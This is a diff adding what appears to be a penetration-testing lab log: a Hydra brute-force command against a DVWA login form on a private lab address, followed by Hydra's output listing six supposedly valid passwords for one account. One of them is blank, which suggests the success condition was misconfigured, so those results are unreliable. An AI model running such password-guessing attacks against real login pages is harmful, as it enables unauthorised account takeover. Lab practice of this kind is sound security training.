@@ -1,0 +1,14 @@
+hydra -l admin -P /home/kali/Desktop/wordlist/password2.txt 192.168.56.101 http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:S=location"
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-23 19:58:03
+[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:1/p:6), ~1 try per task
+[DATA] attacking http-post-form://192.168.56.101:80/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:S=location
+[80][http-post-form] host: 192.168.56.101   login: admin   password: qwerty
+[80][http-post-form] host: 192.168.56.101   login: admin   password: msfadmin
+[80][http-post-form] host: 192.168.56.101   login: admin
+[80][http-post-form] host: 192.168.56.101   login: admin   password: 123456
+[80][http-post-form] host: 192.168.56.101   login: admin   password: admin
+[80][http-post-form] host: 192.168.56.101   login: admin   password: password
+1 of 1 target successfully completed, 6 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-23 19:58:05
